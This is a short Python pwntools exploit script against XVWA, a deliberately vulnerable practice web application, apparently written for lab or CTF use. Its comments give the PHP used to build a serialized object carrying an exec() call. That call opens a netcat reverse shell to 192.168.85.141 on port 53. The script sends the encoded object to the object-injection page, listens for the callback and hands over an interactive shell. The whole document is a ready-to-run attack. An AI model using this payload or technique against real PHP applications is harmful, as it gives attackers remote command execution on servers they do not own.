#!/usr/bin/python 
from pwn import *
import requests, urllib

# http://xvwa/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme%20Vulnerable%20Web%20Application";}
#<?php
#class PHPObjectInjection{
#	public $inject = "exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f');";
#	function __construct(){}
#	function __wakeup(){}
#}
#
#echo serialize(new PHPObjectInjection());
# root@kali:~/CTF/ctf/xvwa/remote# php /tmp/test.php 
# O:18:"PHPObjectInjection":1:{s:6:"inject";s:88:"exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f');";}

obj = urllib.quote("O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:88:\"exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f');\";}")
url = "/xvwa/vulnerabilities/php_object_injection/?r="

shell = listen(53)
r = remote('xvwa', 80, ssl=False)

log.info("[*] Sending request")
r.send('GET %s%s\r\n\r\n' % (url, obj))
r.close()

shell.wait_for_connection()
log.success("Got shell")
shell.interactive()
